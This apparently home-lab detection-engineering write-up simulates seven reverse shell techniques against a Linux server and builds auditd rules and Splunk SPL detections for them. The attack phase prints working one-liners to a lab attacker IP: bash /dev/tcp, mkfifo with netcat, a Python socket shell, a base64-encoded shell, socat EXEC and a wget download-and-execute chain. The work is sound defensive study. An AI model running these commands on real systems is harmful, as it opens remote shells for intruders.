# Project 05 — Reverse Shell and Suspicious Execution Detection

## Overview

This project simulates seven real-world reverse shell and suspicious execution techniques against a monitored Linux server and builds a six-layer behavioral detection framework in Splunk using auditd kernel telemetry. Every technique represents genuine attacker post-exploitation behavior documented in MITRE ATT&CK, and every detection uses behavioral scoring, PROCTITLE hex decoding, and session-scoped correlation rather than simple signature matching.

The project covers the full reverse shell lifecycle — network tool abuse, execution from attacker staging directories, interpreter one-liner shells, base64 encoded payloads, download and execute chains, and multi-signal behavioral correlation. A key architectural lesson learned: auditd watches inodes not symlinks, requiring explicit rules pointing at real binary paths rather than symlink aliases.

---

## Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux VM — 10.10.10.132 |
| Target | Ubuntu Server — splunk-server (10.10.10.198) |
| SIEM | Splunk Enterprise 10.2.2 |
| Log Sources | /var/log/audit/audit.log (auditd) |
| Kernel Monitor | auditd with 61 custom rules (15 new this project) |
| Hypervisor | Proxmox VE on Dell OptiPlex 7060 Micro |
| Network | Isolated lab segment 10.10.10.x behind OPNsense |
| BLIP-AI Playbook | [reverse_shell.py](https://github.com/tjglass814/BLIP-AI/blob/main/playbooks/reverse_shell.py) |

---

## Project Metrics

| Metric | Result |
|---|---|
| New auditd rules added | 15 |
| Total auditd rules | 61 |
| Splunk detections built | 6 |
| Attack simulations run | 7 |
| Attacks successfully detected | 7 |
| Detection rate | 100% |
| Symlink resolution issues discovered | 2 (nc.openbsd, socat1) |
| MITRE techniques covered | T1059.004, T1059.006, T1071, T1105, T1027, T1036 |

---

## Why This Project Matters

Every previous project detected attackers establishing access or hiding activity. This project detects attackers actively communicating — the moment they establish a live interactive shell back to their attack machine after exploitation.

**What a reverse shell actually is:**

Normal connections go client to server. You SSH into a server — you initiate the connection. A reverse shell flips that. The victim machine reaches out to the attacker's machine. The attacker just listens and waits. This matters for detection because outbound connections from servers are often less monitored than inbound, and firewalls typically allow outbound traffic more freely.

**The detection fingerprint isn't the network connection — it's the behavior:**

auditd doesn't see network traffic directly — that's OPNsense's job. auditd sees process execution, file access, and privilege changes. When a reverse shell fires auditd sees the behavior that creates it — interactive bash spawning without a TTY, network tool execution with direct IP arguments, Python importing socket libraries with inline -c execution. Those behavioral signals are what we detect.

---

## Phase 1 — New auditd Rules

15 new rules added bringing total from 46 to 61.

```bash
# Execution from suspicious staging directories
sudo auditctl -w /tmp -p x -k suspicious_exec
sudo auditctl -w /dev/shm -p x -k suspicious_exec
sudo auditctl -w /var/tmp -p x -k suspicious_exec

# Network tools — symlink-resolved real binary paths
sudo auditctl -w /usr/bin/nc -p x -k reverse_shell_tool
sudo auditctl -w /usr/bin/nc.openbsd -p x -k reverse_shell_tool
sudo auditctl -w /usr/bin/ncat -p x -k reverse_shell_tool
sudo auditctl -w /usr/bin/netcat -p x -k reverse_shell_tool
sudo auditctl -w /usr/bin/socat -p x -k reverse_shell_tool
sudo auditctl -w /usr/bin/socat1 -p x -k reverse_shell_tool

# Script interpreters
sudo auditctl -w /usr/bin/python3 -p x -k interpreter_exec
sudo auditctl -w /usr/bin/python3.12 -p x -k interpreter_exec
sudo auditctl -w /usr/bin/perl -p x -k interpreter_exec
sudo auditctl -w /usr/bin/ruby -p x -k interpreter_exec

# Download tools
sudo auditctl -w /usr/bin/wget -p x -k download_tool
sudo auditctl -w /usr/bin/curl -p x -k download_tool

# Encoding tools
sudo auditctl -w /usr/bin/base64 -p x -k encoding_tool
```

Rules made permanent:

```bash
sudo auditctl -l | sudo tee /etc/audit/rules.d/blip-ai.rules > /dev/null
sudo systemctl restart auditd
sudo auditctl -l | wc -l
# Result: 61
```

**Critical lesson learned — symlink resolution:**

`/usr/bin/nc` is a symlink pointing to `/etc/alternatives/nc` which points to `/usr/bin/nc.openbsd`. auditd watches inodes not paths — watching the symlink watches the wrong inode. Explicit rules pointing at the real binary are required. Same issue with `/usr/bin/socat` pointing to `/usr/bin/socat1`.

Diagnosis command used when rules didn't fire:
```bash
ls -la $(which nc)
# /usr/bin/nc -> /etc/alternatives/nc -> /usr/bin/nc.openbsd
```

---

## Phase 2 — Attack Simulations

All attacks executed from a labadmin shell on the Ubuntu server simulating post-exploitation attacker behavior. Kali Linux at 10.10.10.132 acted as the receiving attacker machine.

### Attack 1 — bash /dev/tcp Reverse Shell

```bash
# On Kali
nc -lvnp 4444

# On Ubuntu
echo '#!/bin/bash' > /tmp/shell.sh
echo 'bash -i >& /dev/tcp/10.10.10.132/4444 0>&1' >> /tmp/shell.sh
chmod +x /tmp/shell.sh
/tmp/shell.sh
```

**Result:** Shell connected on Kali port 4444. labadmin access confirmed. Caught by suspicious_exec rule — execution from /tmp/shell.sh.

**Key lesson — shebang required:** Without `#!/bin/bash` the kernel returns ENOEXEC (exit=-8) — execution fails because the kernel doesn't know which interpreter to use. The shebang line tells the kernel "hand this to bash."

<img width="1276" height="462" alt="Screenshot 2026-05-06 at 4 20 17 PM" src="https://github.com/user-attachments/assets/24393ccc-6b70-4b92-85fc-8b357cce2aac" />

---

### Attack 2 — mkfifo Named Pipe Reverse Shell

```bash
# On Kali
nc -lvnp 5555

# On Ubuntu
rm /tmp/f 2>/dev/null; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.10.132 5555 > /tmp/f
```

**Result:** Shell connected on Kali port 5555. nc.openbsd execution captured by reverse_shell_tool rule with destination IP and port visible in EXECVE record.

**Plain English:** mkfifo creates a named pipe — a walkie-talkie channel. Kali sends commands through one end, bash executes them, output travels back through netcat. The loop creates a fully interactive shell.

<img width="1276" height="202" alt="Screenshot 2026-05-06 at 4 35 40 PM" src="https://github.com/user-attachments/assets/2004b8d8-bff7-4bb8-b088-9c000583ed6a" />

---

### Attack 3 — Python Socket Reverse Shell

```bash
# On Kali
nc -lvnp 6666

# On Ubuntu
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.132',6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])"
```

**Result:** Shell connected on Kali port 6666. interpreter_exec rule fired. PROCTITLE hex decoded to reveal full Python one-liner including socket import and destination IP.

**Why Python is dangerous:** Python is installed on almost every Linux server. One line creates a fully functional reverse shell using only built-in libraries — no extra tools required.

<img width="1276" height="145" alt="Screenshot 2026-05-06 at 4 56 38 PM" src="https://github.com/user-attachments/assets/106bf29a-4e1e-46db-9c4a-e9c3ea6a6716" />

---

### Attack 4 — Python PTY Upgrade

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
```

**Result:** interpreter_exec rule fired. PTY upgrade converts a basic pipe into a fully interactive terminal with tab completion and proper formatting. Commonly run immediately after establishing any reverse shell.

---

### Attack 5 — Base64 Encoded Payload

```bash
# Encode payload
echo 'bash -i >& /dev/tcp/10.10.10.132/7777 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzIvNzc3NyAwPiYxCg==

# On Kali
nc -lvnp 7777

# On Ubuntu — execute encoded payload
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMzIvNzc3NyAwPiYxCg==' | base64 -d | bash
```

**Result:** Shell connected on Kali port 7777. encoding_tool rule fired capturing `base64 -d`. The dangerous payload `bash -i >& /dev/tcp` was never written to disk as plain text — only existed decoded in memory for milliseconds.

**Why base64 matters:** Simple text scanners looking for `bash -i >& /dev/tcp` miss this entirely. The payload looks like random characters. Detection requires catching the decode operation itself.

<img width="1276" height="191" alt="Screenshot 2026-05-06 at 5 07 43 PM" src="https://github.com/user-attachments/assets/55f49a11-a766-4bd7-acb7-dc33f56a257e" />

---

### Attack 6 — socat Reverse Shell

```bash
# On Kali
socat -d -d TCP-LISTEN:8888,reuseaddr -

# On Ubuntu
socat TCP:10.10.10.132:8888 EXEC:'/bin/bash'
```

**Result:** socat connection established on Kali port 8888. reverse_shell_tool rule fired with `exe="/usr/bin/socat1"` — the real binary behind the symlink. EXECVE record showed full command including destination IP and EXEC:/bin/bash argument.

**Why socat is more dangerous than nc:** socat creates a fully interactive terminal with proper TTY handling. Tab completion works, arrow keys work, it behaves exactly like SSH. Much harder to notice in process listings.

<img width="1276" height="172" alt="Screenshot 2026-05-06 at 5 29 19 PM" src="https://github.com/user-attachments/assets/b37d061c-1feb-4e5e-b028-3b04329d5df4" />

---

### Attack 7 — Download and Execute Chain

```bash
wget -O /tmp/payload.sh http://10.10.10.132/payload.sh 2>/dev/null
echo '#!/bin/bash' > /tmp/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
```

**Result:** wget and bash execution both captured in the same session. Download chain correlation detected — download at 19:49:49 → execution at 19:58:41, 532 second chain.

---

## Phase 3 — Detection Engineering

Six behavioral detection rules built in Splunk. All use session-scoped correlation via the `ses` field. Key architectural decision: PROCTITLE hex decoding used instead of EXECVE argument parsing because Python and Perl payloads store the actual code as hex in EXECVE records — unreadable without decoding. PROCTITLE stores the full command as one decodable hex string.

<img width="1276" height="685" alt="Screenshot 2026-05-06 at 5 45 05 PM" src="https://github.com/user-attachments/assets/c4d4756f-8e0a-418b-9fd9-1b887a05e675" />

---

### Detection 1 — Network Tool Execution

**What it catches:** nc, ncat, socat executing with direct IP connections and shell execution flags. Uses full command reconstruction from EXECVE records so argument position shifts don't break detection. Port bonus applied for known reverse shell ports (4444, 1337, 9001, etc).

```spl
index=main sourcetype=linux_audit earliest=-15m
key="reverse_shell_tool"
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes" OR success="1"
| join event_id [
    search index=main sourcetype=linux_audit type=EXECVE
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "a0=\"(?P<a0>[^\"]+)\""
    | rex field=_raw "a1=\"(?P<a1>[^\"]+)\""
    | rex field=_raw "a2=\"(?P<a2>[^\"]+)\""
    | rex field=_raw "a3=\"(?P<a3>[^\"]+)\""
    | eval full_command=coalesce(a0,"")." ".coalesce(a1,"")." ".coalesce(a2,"")." ".coalesce(a3,"")
    | table event_id a0 a1 a2 a3 full_command
]
| eval interaction_type=if(tty="(none)","non_interactive","interactive")
| eval binary=mvindex(split(exe,"/"),-1)
| eval tool_type=case(
    match(binary,"^(nc|netcat|ncat|nc\.openbsd)$"),
        "Netcat — pipe data over network connections",
    match(binary,"^(socat|socat1)$"),
        "Socat — advanced bidirectional data relay",
    true(), "Unknown network tool")
| eval direct_ip=if(
    match(full_command,"\d+\.\d+\.\d+\.\d+"),
    "YES — Direct IP connection detected",
    "NO — No direct IP in command")
| eval exec_flag=if(
    match(full_command,"(/bin/bash|/bin/sh|bash -i|sh -i|nc .* -e|ncat .* --exec|socat .* EXEC:)"),
    "YES — Shell execution behavior detected",
    "NO")
| rex field=full_command "(?<port>\d{2,5})$"
| eval suspicious_port=if(
    port IN ("4444","5555","6666","7777","8888","1337","9001","4443","443","80"),
    "YES — Common reverse shell port detected",
    "NO — Non-standard port")
| eval base_score=case(
    interaction_type="interactive"
        AND direct_ip="YES — Direct IP connection detected"
        AND exec_flag="YES — Shell execution behavior detected", 0.95,
    interaction_type="interactive"
        AND direct_ip="YES — Direct IP connection detected", 0.85,
    interaction_type="interactive", 0.75,
    interaction_type="non_interactive"
        AND direct_ip="YES — Direct IP connection detected", 0.80,
    true(), 0.60)
| eval port_bonus=if(suspicious_port="YES — Common reverse shell port detected", 0.05, 0.0)
| eval final_confidence=min(base_score + port_bonus, 1.0)
| stats count values(exe) as tools_used
    values(tool_type) as tool_description
    values(full_command) as full_commands
    values(direct_ip) as ip_analysis
    values(exec_flag) as exec_analysis
    values(port) as ports_used
    values(suspicious_port) as port_analysis
    values(interaction_type) as session_type
    max(final_confidence) as confidence_score by auid host ses
| eval risk_level=case(
    confidence_score>=0.90,
        "CRITICAL — Network tool executing shell to direct IP",
    confidence_score>=0.80,
        "HIGH — Network tool connecting to direct IP",
    confidence_score>=0.70,
        "HIGH — Network tool executed by interactive user",
    true(), "MEDIUM — Network tool activity")
| eval known_gap="bash /dev/tcp bypasses this — no external binary executed"
| table auid host ses tools_used tool_description full_commands
    ip_analysis exec_analysis ports_used port_analysis
    session_type confidence_score risk_level known_gap
| sort -confidence_score
```

**Alert:** `Reverse Shell Network Tool Detected` — Scheduled `*/5 * * * *`, Critical severity
**Confidence:** 1.0 CRITICAL
**MITRE:** T1059.004, T1071

---

### Detection 2 — Execution from Suspicious Staging Directory

**What it catches:** Script or binary execution from /tmp, /dev/shm, /var/tmp. Uses PATH record join to identify specific files executed. /dev/shm scores highest — memory-backed execution leaves limited persistent disk evidence. Deleted-after-execution behavior raises score to 0.92.

```spl
index=main sourcetype=linux_audit earliest=-15m
key="suspicious_exec" type=SYSCALL
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes" OR success="1"
| join type=left event_id [
    search index=main sourcetype=linux_audit type=PATH
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "name=\"(?P<filepath>[^\"]+)\""
    | rex field=_raw "nametype=(?P<nametype>\w+)"
    | where match(filepath,"^/tmp/|^/dev/shm/|^/var/tmp/")
    | where nametype="NORMAL"
    | where match(filepath,"\.sh$|\.py$|\.pl$|\.elf$|\.bin$")
        OR match(filepath,"^/tmp/[^/.]+$")
        OR match(filepath,"^/dev/shm/[^/.]+$")
    | table event_id filepath nametype
]
| where isnotnull(filepath)
| eval interaction_type=if(tty="(none)","non_interactive","interactive")
| eval directory=case(
    match(filepath,"^/dev/shm/"),
        "/dev/shm — Memory-backed execution — limited persistent disk evidence",
    match(filepath,"^/tmp/"),
        "/tmp — World-writable staging directory",
    match(filepath,"^/var/tmp/"),
        "/var/tmp — Persistent temp directory — survives reboots",
    true(), "Unknown suspicious path")
| eval file_type=case(
    match(filepath,"\.sh$"), "Shell script",
    match(filepath,"\.py$"), "Python script",
    match(filepath,"\.pl$"), "Perl script",
    match(filepath,"\.elf$|\.bin$"), "Binary executable",
    match(filepath,"^/tmp/[^/.]+$") OR match(filepath,"^/dev/shm/[^/.]+$"),
        "No extension — possible obfuscated binary",
    true(), "Unknown file type")
| eval deleted_after_exec=if(nametype="DELETE",
    "YES — File removed after execution","NO")
| eval base_score=case(
    match(filepath,"^/dev/shm/")
        AND interaction_type="interactive", 0.95,
    match(filepath,"^/dev/shm/"), 0.85,
    match(filepath,"^/tmp/")
        AND deleted_after_exec="YES — File removed after execution"
        AND interaction_type="interactive", 0.92,
    match(filepath,"^/tmp/")
        AND interaction_type="interactive", 0.85,
    match(filepath,"^/var/tmp/")
        AND interaction_type="interactive", 0.80,
    interaction_type="interactive", 0.70,
    true(), 0.55)
| stats count values(exe) as executables
    values(filepath) as files_executed
    values(directory) as directory_context
    values(file_type) as file_types
    values(deleted_after_exec) as deletion_behavior
    values(interaction_type) as session_type
    max(base_score) as confidence_score by auid host ses
| eval risk_level=case(
    confidence_score>=0.90,
        "CRITICAL — Execution from memory-backed or cleaned staging directory",
    confidence_score>=0.80,
        "HIGH — Interactive execution from suspicious staging directory",
    confidence_score>=0.65,
        "MEDIUM — Execution from world-writable directory",
    true(), "LOW — Temp directory activity")
| eval forensic_note=if(
    mvfind(directory_context,"/dev/shm")>=0,
    "WARNING — Memory-backed execution — limited persistent disk evidence",
    "NOTE — File may still be recoverable from disk")
| table auid host ses executables files_executed directory_context
    file_types deletion_behavior session_type
    confidence_score risk_level forensic_note
| sort -confidence_score
```

**Alert:** `Execution from Suspicious Staging Directory` — Scheduled `*/5 * * * *`, High severity
**Confidence:** 0.85 HIGH
**MITRE:** T1059.004, T1036

---

### Detection 3 — Interpreter Abuse

**What it catches:** Python, Perl, Ruby executing inline code via -c or -e flags combined with network socket libraries and shell spawning behavior. Uses PROCTITLE hex decoding for full command visibility — EXECVE arguments are hex-encoded for long payloads making them unreadable without decoding.

**Key design decision:** PROCTITLE used over EXECVE because Python reverse shell payloads are stored as hex in EXECVE a2 field. PROCTITLE decodes the entire command as one readable string.

```spl
index=main sourcetype=linux_audit earliest=-15m
key="interpreter_exec" type=SYSCALL
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes" OR success="1"
| join type=left event_id [
    search index=main sourcetype=linux_audit earliest=-15m type=PROCTITLE
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "proctitle=(?P<proctitle_hex>[A-Fa-f0-9]+)"
    | eval proctitle_clean=replace(proctitle_hex,"00"," ")
    | eval decoded=urldecode(replace(proctitle_clean,"([A-Fa-f0-9]{2})","%" . "\1"))
    | table event_id decoded
]
| eval interaction_type=if(tty="(none)","non_interactive","interactive")
| eval binary=mvindex(split(exe,"/"),-1)
| eval interpreter=case(
    match(binary,"^python"), "Python",
    match(binary,"^perl"), "Perl",
    match(binary,"^ruby"), "Ruby",
    true(), "Unknown interpreter")
| eval inline_execution=if(
    match(decoded,"python3 -c|python -c|perl -e|ruby -e"),
    "YES — Inline code execution via flag",
    "NO — Script file execution")
| eval network_libraries=if(
    match(decoded,"socket|subprocess|os\.dup|pty\.spawn|Net::Telnet|IO::Socket|SOCK_STREAM"),
    "YES — Network or shell library detected",
    "NO")
| eval shell_spawn=if(
    match(decoded,"/bin/bash|/bin/sh|pty\.spawn|subprocess\.call.*bash"),
    "YES — Shell spawning behavior",
    "NO")
| eval base_score=case(
    inline_execution="YES — Inline code execution via flag"
        AND network_libraries="YES — Network or shell library detected"
        AND shell_spawn="YES — Shell spawning behavior"
        AND interaction_type="interactive", 0.97,
    inline_execution="YES — Inline code execution via flag"
        AND network_libraries="YES — Network or shell library detected"
        AND interaction_type="interactive", 0.90,
    inline_execution="YES — Inline code execution via flag"
        AND shell_spawn="YES — Shell spawning behavior"
        AND interaction_type="interactive", 0.88,
    inline_execution="YES — Inline code execution via flag"
        AND interaction_type="interactive", 0.75,
    inline_execution="YES — Inline code execution via flag", 0.65,
    true(), 0.0)
| where base_score >= 0.65
| stats count values(exe) as interpreters_used
    values(interpreter) as interpreter_types
    values(decoded) as commands_decoded
    values(inline_execution) as execution_method
    values(network_libraries) as library_analysis
    values(shell_spawn) as shell_behavior
    values(interaction_type) as session_type
    max(base_score) as confidence_score by auid host ses
| eval risk_level=case(
    confidence_score>=0.95,
        "CRITICAL — Interpreter spawning shell with network libraries inline",
    confidence_score>=0.85,
        "CRITICAL — Interpreter reverse shell pattern detected",
    confidence_score>=0.75,
        "HIGH — Inline interpreter execution with suspicious libraries",
    confidence_score>=0.65,
        "HIGH — Inline code execution via interpreter",
    true(), "MEDIUM — Interpreter execution detected")
| eval known_gap="PROCTITLE may truncate very long payloads"
| table auid host ses interpreters_used interpreter_types commands_decoded
    execution_method library_analysis shell_behavior
    session_type confidence_score risk_level known_gap
| sort -confidence_score
```

**Alert:** `Interpreter Abuse — Inline Reverse Shell Detected` — Scheduled `*/5 * * * *`, Critical severity
**Confidence:** 0.90 CRITICAL
**MITRE:** T1059.006, T1059.003

---

### Detection 4 — Base64 Encoded Payload Execution

**What it catches:** base64 decode operations by interactive users. The dangerous payload is never written to disk as plain text — detection catches the decode stage. Correlation with subsequent bash or network activity raises confidence.

```spl
index=main sourcetype=linux_audit earliest=-15m
key="encoding_tool" type=SYSCALL
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes" OR success="1"
| join type=left event_id [
    search index=main sourcetype=linux_audit earliest=-15m type=PROCTITLE
    | rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
    | rex field=_raw "proctitle=(?P<proctitle_hex>[A-Fa-f0-9]+)"
    | eval proctitle_clean=replace(proctitle_hex,"00"," ")
    | eval decoded=urldecode(replace(proctitle_clean,"([A-Fa-f0-9]{2})","%" . "\1"))
    | table event_id decoded
]
| eval interaction_type=if(tty="(none)","non_interactive","interactive")
| eval decode_flag=if(
    match(decoded,"base64\s+-d|base64\s+--decode"),
    "YES — Decoding operation detected",
    "NO")
| eval suspicious_context=if(
    match(decoded,"base64 -d|openssl enc|python.*b64decode"),
    "YES — Encoded payload execution pattern",
    "NO")
| eval base_score=case(
    decode_flag="YES — Decoding operation detected"
        AND interaction_type="interactive", 0.85,
    decode_flag="YES — Decoding operation detected", 0.75,
    suspicious_context="YES — Encoded payload execution pattern"
        AND interaction_type="interactive", 0.80,
    true(), 0.55)
| stats count values(exe) as tools
    values(decoded) as commands
    values(decode_flag) as decode_analysis
    values(suspicious_context) as context_analysis
    values(interaction_type) as session_type
    max(base_score) as confidence_score by auid host ses
| eval risk_level=case(
    confidence_score>=0.85,
        "HIGH — Interactive base64 decode — possible payload execution",
    confidence_score>=0.75,
        "HIGH — Base64 decode operation detected",
    true(), "MEDIUM — Encoding tool activity")
| eval known_gap="Pipe to bash not visible in auditd — base64 decode caught but execution chain requires correlation with subsequent bash activity"
| table auid host ses tools commands decode_analysis
    context_analysis session_type confidence_score risk_level known_gap
| sort -confidence_score
```

**Alert:** `Base64 Encoded Payload Execution Detected` — Scheduled `*/5 * * * *`, High severity
**Confidence:** 0.85 HIGH
**MITRE:** T1027, T1059

---

### Detection 5 — Download and Stage Execution Chain

**What it catches:** curl or wget download followed by execution from the same session. Chain duration under 300 seconds scores 0.95 CRITICAL. Session-scoped correlation prevents false positives from separate admin sessions. Implements Eva's CRITICAL GAP #2 — temporal download-to-execute correlation.

```spl
index=main sourcetype=linux_audit earliest=-15m
(key="download_tool" OR key="suspicious_exec")
type=SYSCALL
| rex field=_raw "msg=audit\([^:]+:(?P<event_id>\d+)\)"
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes" OR success="1"
| eval interaction_type=if(tty="(none)","non_interactive","interactive")
| eval binary=mvindex(split(exe,"/"),-1)
| eval event_type=case(
    key="download_tool", "download",
    key="suspicious_exec", "execution",
    true(), "other")
| stats
    dc(event_type) as chain_steps
    values(exe) as binaries
    values(event_type) as events_seen
    min(_time) as first_seen
    max(_time) as last_seen
    values(interaction_type) as session_type
    by auid host ses
| eval chain_duration_seconds=round(last_seen - first_seen, 0)
| eval download_and_exec=if(
    mvfind(events_seen,"download")>=0
    AND mvfind(events_seen,"execution")>=0,
    "YES — Download followed by execution",
    "NO — Incomplete chain")
| eval base_score=case(
    download_and_exec="YES — Download followed by execution"
        AND mvfind(session_type,"interactive")>=0
        AND chain_duration_seconds<=300, 0.95,
    download_and_exec="YES — Download followed by execution"
        AND mvfind(session_type,"interactive")>=0, 0.85,
    download_and_exec="YES — Download followed by execution", 0.75,
    chain_steps>=1 AND mvfind(session_type,"interactive")>=0, 0.55,
    true(), 0.40)
| where base_score >= 0.55
| eval risk_level=case(
    base_score>=0.90,
        "CRITICAL — Download and execute chain within 5 minutes",
    base_score>=0.80,
        "HIGH — Download followed by execution same session",
    true(), "MEDIUM — Download tool or staging activity")
| eval attack_narrative=
    "Download at ".strftime(first_seen,"%H:%M:%S").
    " → Execution at ".strftime(last_seen,"%H:%M:%S").
    " (".tostring(chain_duration_seconds)." seconds)"
| table auid host ses binaries events_seen download_and_exec
    chain_duration_seconds attack_narrative
    session_type base_score risk_level
| sort -base_score
```

**Alert:** `Download and Stage Execution Chain Detected` — Scheduled `*/5 * * * *`, High severity
**Confidence:** 0.85 HIGH
**MITRE:** T1105, T1059

---

### Detection 6 — Combined Reverse Shell Behavioral Score

**What it catches:** Multiple reverse shell techniques from the same session within one hour. Two techniques = HIGH. Four or more = CRITICAL. Session 669 in testing hit all four categories — download, encode, stage, interpret — scoring 1.0 CRITICAL automatically.

```spl
index=main sourcetype=linux_audit earliest=-1h
(key="reverse_shell_tool" OR key="suspicious_exec" OR key="interpreter_exec"
OR key="encoding_tool" OR key="download_tool")
type=SYSCALL
| rex field=_raw "AUID=\"(?P<auid>[^\"]+)\""
| rex field=_raw "ses=(?P<ses>\d+)"
| rex field=_raw "tty=(?P<tty>\S+)"
| rex field=_raw "success=(?P<success>\w+)"
| rex field=_raw "key=\"(?P<key>[^\"]+)\""
| rex field=_raw "exe=\"(?P<exe>[^\"]+)\""
| where auid!="unset" AND auid!="4294967295" AND isnotnull(auid)
| where success="yes" OR success="1"
| eval interaction_type=if(tty="(none)","non_interactive","interactive")
| eval technique=case(
    key="reverse_shell_tool", "Network Tool Executed",
    key="suspicious_exec", "Execution from Staging Directory",
    key="interpreter_exec", "Interpreter Abuse",
    key="encoding_tool", "Encoded Payload",
    key="download_tool", "Download Tool Executed",
    true(), "Unknown")
| eval technique_weight=case(
    key="reverse_shell_tool", 0.40,
    key="suspicious_exec", 0.30,
    key="interpreter_exec", 0.35,
    key="encoding_tool", 0.25,
    key="download_tool", 0.20,
    true(), 0.10)
| stats
    dc(technique) as technique_count
    values(technique) as techniques_detected
    sum(technique_weight) as raw_score
    values(interaction_type) as session_types
    values(exe) as binaries_used
    min(_time) as first_seen
    max(_time) as last_seen
    by auid host ses
| eval duration_minutes=round((last_seen - first_seen)/60, 1)
| eval combined_score=min(round(raw_score, 2), 1.0)
| eval interactive_bonus=if(
    mvfind(session_types,"interactive")>=0, 0.10, 0.0)
| eval final_confidence=min(combined_score + interactive_bonus, 1.0)
| where technique_count >= 2
| eval risk_level=case(
    technique_count>=4,
        "CRITICAL — Full reverse shell attack chain detected",
    technique_count>=3,
        "CRITICAL — Multiple reverse shell techniques same session",
    technique_count>=2,
        "HIGH — Combined suspicious execution behavior",
    true(), "MEDIUM — Suspicious activity")
| eval attack_phase="ACTIVE INTRUSION — Reverse shell behavior across multiple techniques"
| eval techniques_summary=mvjoin(techniques_detected," | ")
| table auid host ses technique_count techniques_summary
    binaries_used final_confidence risk_level
    duration_minutes attack_phase
| sort -final_confidence
```

**Alert:** `Combined Reverse Shell Behavioral Score` — Scheduled `*/5 * * * *`, Critical severity
**Confidence:** 1.0 CRITICAL
**MITRE:** T1059, T1071, T1105, T1027

---

## Alert Validation Summary

All six alerts confirmed firing against real attack data:

| Alert | Severity | Confidence | Triggered By |
|---|---|---|---|
| Reverse Shell Network Tool Detected | Critical | 1.0 | nc and socat with direct IP and shell exec flag |
| Execution from Suspicious Staging Directory | High | 0.85 | /tmp/shell.sh executed with shebang |
| Interpreter Abuse — Inline Reverse Shell | Critical | 0.90 | python3 -c with socket and subprocess libraries |
| Base64 Encoded Payload Execution | High | 0.85 | base64 -d by interactive user |
| Download and Stage Execution Chain | High | 0.85 | wget followed by bash execution same session |
| Combined Reverse Shell Behavioral Score | Critical | 1.0 | 4 techniques in session 669 |

---

## Key Architectural Lessons

**Symlink resolution:** auditd watches inodes not paths. `/usr/bin/nc` points to `/usr/bin/nc.openbsd`. Rules must point at real binaries. Always verify with `ls -la $(which <binary>)` when rules don't fire.

**PROCTITLE vs EXECVE:** Python and Perl payloads are hex-encoded in EXECVE argument fields — unreadable without decoding. PROCTITLE stores the full command as one decodable hex string. Always prefer PROCTITLE for interpreter detection.

**Time window consistency:** Both the main search and subsearch must use the same `earliest` time range. Splunk subsearches do not inherit the outer search time range automatically.

**False positive reduction:** `where success="yes" OR success="1"` is critical — failed execution attempts would flood results without it. `where base_score >= 0.65` ensures only behavioral matches surface.

---

## Known Detection Gaps

| Gap | Description | Mitigation Path |
|---|---|---|
| bash /dev/tcp | Built-in bash networking — no external binary executed | Monitor for bash -i with no TTY and network socket syscalls |
| Encoded interpreter payloads | PROCTITLE truncates very long payloads | V2 — full syscall argument reconstruction |
| Renamed binaries | cp /usr/bin/nc /tmp/clean bypasses all tool rules | Syscall-based detection not binary name watching |
| Memory-only execution | python -c without touching disk | eBPF monitoring of socket syscalls directly |

---

## MITRE ATT&CK Mapping

| Technique | ID | Phase | Detected |
|---|---|---|---|
| Unix Shell | T1059.004 | Execution | ✅ Detections 1, 2 |
| Python | T1059.006 | Execution | ✅ Detection 3 |
| Application Layer Protocol | T1071 | C2 | ✅ Detection 1 |
| Ingress Tool Transfer | T1105 | C2 | ✅ Detection 5 |
| Obfuscated Files | T1027 | Defense Evasion | ✅ Detection 4 |
| Masquerading | T1036 | Defense Evasion | ✅ Detection 2 |

---
